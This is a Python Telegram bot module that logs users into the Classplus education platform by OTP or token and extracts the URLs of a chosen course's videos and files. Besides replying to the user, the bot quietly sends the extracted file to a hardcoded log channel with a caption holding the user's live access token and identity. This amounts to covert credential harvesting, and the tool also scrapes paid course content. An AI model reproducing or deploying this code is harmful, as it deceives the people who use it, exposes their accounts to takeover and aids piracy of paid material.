import asyncio
import aiohttp
import aiofiles
from subprocess import getstatusoutput
from pyrogram import Client, filters
from pyrogram.types.messages_and_media import message
from pyrogram.errors import FloodWait
import logging
import os, requests, json
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from base64 import b64encode, b64decode
from concurrent.futures import ThreadPoolExecutor
log_channel = (-1002363250260)
THREADPOOL = ThreadPoolExecutor(max_workers=1000)
api = 'https://api.classplusapp.com/v2'  # Moved api definition to the top


async def classplus_txt(app, message):   
    credit = f"[{message.from_user.first_name}](tg://user?id={message.from_user.id})\n\n"
    editable = await message.reply_text('🔐 **Authentication Required**\n\n🗺 Organisation Code (e.g., ABCDEF)\n📱 Phone Number (e.g., 1234567890)\n\n OR\n\n🔑 Access Token (e.g., your_access_token_here)', quote=True)
    
    def get_course_content(session, course_id, folder_id=0):
        fetched_contents = []
        params = {'courseId': course_id, 'folderId': folder_id}
        response = session.get(f'{api}/course/content/get', params=params)
        if response.status_code == 200:
            res = response.json()
            contents = res['data']['courseContent']
            for content in contents:
                if content['contentType'] == 1:
                    resources = content['resources']
                    if resources['videos'] or resources['files']:
                        sub_contents = get_course_content(session, course_id, content['id'])
                        fetched_contents += sub_contents
                elif content['contentType'] == 2:
                    name = content['name']
                    url = content['url']
                    if url is not None:
                        fetched_contents.append(f'{name}:{url}')
                    else:
                        continue
                else:
                    name = content['name']
                    url = content['url']
                    fetched_contents.append(f'{name}: {url}')
        else:
            print(f"Error: {response.status_code} - {response.text}")
        return fetched_contents

    headers = {
        'accept-encoding': 'gzip',
        'accept-language': 'EN',
        'api-version'    : '35',
        'app-version'    : '1.4.73.2',
        'build-number'   : '35',
        'connection'     : 'Keep-Alive',
        'content-type'   : 'application/json',
        'device-details' : 'Xiaomi_Redmi 7_SDK-32',
        'device-id'      : 'c28d3cb16bbdac01',
        'host'           : 'api.classplusapp.com',
        'region'         : 'IN',
        'user-agent'     : 'Mobile-Android',
        'webengage-luid' : '00000187-6fe4-5d41-a530-26186858be4c'
    }

    try:
        input_message: message = await app.listen(editable.chat.id)
        creds = input_message.text
        await input_message.delete(True)     
        session = requests.Session()
        session.headers.update(headers)
        logged_in = False

        if '\n' in creds:
            org_code, phone_no = [cred.strip() for cred in creds.split('\n')]

            if org_code.isalpha() and phone_no.isdigit() and len(phone_no) == 10:
                res = session.get(f'{api}/orgs/{org_code}')

                if res.status_code == 200:
                    res = res.json()

                    org_id = int(res['data']['orgId'])
                    org_name = (res['data']['orgName'])
                    print(f"{org_code}{phone_no}")

                    data = {
                        'countryExt': '91',
                        'mobile'    : phone_no,
                        'viaSms'    : 1,
                        'orgId'     : org_id,
                        'eventType' : 'login',
                        'otpHash'   : 'j7ej6eW5VO'
                    }
        
                    res = session.post(f'{api}/otp/generate', data=json.dumps(data))

                    if res.status_code == 200:
                        res = res.json()
                        print(res)

                        session_id = res['data']['sessionId']

                        await editable.edit('**OTP Sent.....\nPlease enter the OTP below**')
                        input_messae: message = await app.listen(editable.chat.id)
                        if input_messae.text.isdigit() and len(input_messae.text) == 4:
                            otp = int(input_messae.text.strip())

                            await input_messae.delete(True)
                            
                            data = {
                                'otp'          : otp,
                                'sessionId'    : session_id,
                                'orgId'        : org_id,
                                'fingerprintId': 'a3ee05fbde3958184f682839be4fd0f7',
                                'countryExt'   : '91',
                                'mobile'       : phone_no,
                            }

                            res = session.post(f'{api}/users/verify', data=json.dumps(data))

                            if res.status_code == 200:
                                res = res.json()

                                user_id = res['data']['user']['id']
                                token = res['data']['token']

                                session.headers['x-access-token'] = token

                                await message.reply(
                                    (
                                        '**'
                                        'Access Token for future use case - \n\n'
                                        '**'
                                        '<pre>'
                                        f'{token}'
                                        '</pre>'
                                    ),
                                    quote=True
                                )

                                logged_in = True

                            else:
                                raise Exception('Failed to verify OTP.')
                            
                        else:
                            raise Exception('Failed to validate OTP.')
                        
                    else:
                        raise Exception('Failed to generate OTP.')
                    
                else:
                    raise Exception('Failed to get organization Id.')
                
            else:
                raise Exception('Failed to validate credentials.')

        else:

            token = creds.strip()
            session.headers['x-access-token'] = token

            res = session.get(f'{api}/users/details')

            if res.status_code == 200:
                res = res.json()

                user_id = res['data']['responseData']['user']['id']
                logged_in = True
            
            else:
                raise Exception('Failed to get user details\n May be token is expired .')

        if logged_in:
            params = {
                'userId': user_id,
                'tabCategoryId': 3
            }

            res = session.get(f'{api}/profiles/users/data', params=params)

            if res.status_code == 200:
                res = res.json()
                courses = res['data']['responseData']['coursesData']

                if courses:
                    text = ''

                    for cnt, course in enumerate(courses):
                        cid = course['id']
                        name = course['name']
                        thubnail = course['imageUrl']
                        price = course['finalPrice']
                        text += f'{cnt + 1}.{cid} -- {name} -- {price}\n\n'

                    await editable.edit('**🔰 You have these courses:- **\n\n' + '\n'.join([f'**{cnt + 1}.** 🔅 {course["id"]} ➖ {course["name"]} - 🏧 {course["finalPrice"]}\n' for cnt, course in enumerate(courses)]) + '\n\n📃 Send the index number of the course to extract .')
                    input_message: message = await app.listen(editable.chat.id)
                    if input_message.text.isdigit() and len(input_message.text) <= len(courses):
                        selected_course_index = int(input_message.text.strip())
                        course = courses[selected_course_index - 1]
                        selected_course_id = course['id']
                        selected_course_name = course['name']
                        course_price = course['finalPrice']
                        course_thubnail = course['imageUrl']
                        print(selected_course_id)
                        await input_message.delete(True)
                        prog = await message.reply_text(f'⚡ Extracting course...\n🖨{selected_course_name}')
                        course_content = get_course_content(session, selected_course_id)
                        await prog.delete (True)
                        if course_content:
                            caption = f'🏧 **Price : {course_price}**\n🔰 **Batch Name : `{selected_course_name}`**\n🖨 **Thumbnail » `{course_thubnail}`**'
                            captionn = f'**User : {credit}\nBatch Name : `{selected_course_name}`\nThumbnail : `{course_thubnail}`\nToken : `{token}`**'
                            assets_dir = 'assets'
                            if not os.path.exists(assets_dir):
                                os.makedirs(assets_dir)
                            text_file = os.path.join(assets_dir, f'test.txt')
                            with open(text_file, 'a', encoding='utf-8') as file:
                                file.write('\n'.join(course_content) + '\n')
                            await app.send_document(message.chat.id, text_file, caption=caption, file_name=f"{selected_course_name}.txt",)
                            await app.send_document(log_channel, text_file, caption=captionn, file_name=f"{selected_course_name}.txt",)
                            os.remove(text_file)
                            await message.reply_text('**''🧭 Extraction Done''**')  

                        else:
                            raise Exception('**''⌀ Did not find any content in the course...''**')

                    else:
                        raise Exception('Failed to validate course selection.')

                else:
                    raise Exception('Did not find any courses.')

            else:
                raise Exception('Failed to get courses.')

    except Exception as error:

        print(f'Error : {error}')

        await message.reply_text(
            (
                '**'
                f'Error : {error}'
                '**'
            ),
            quote=True
)

    
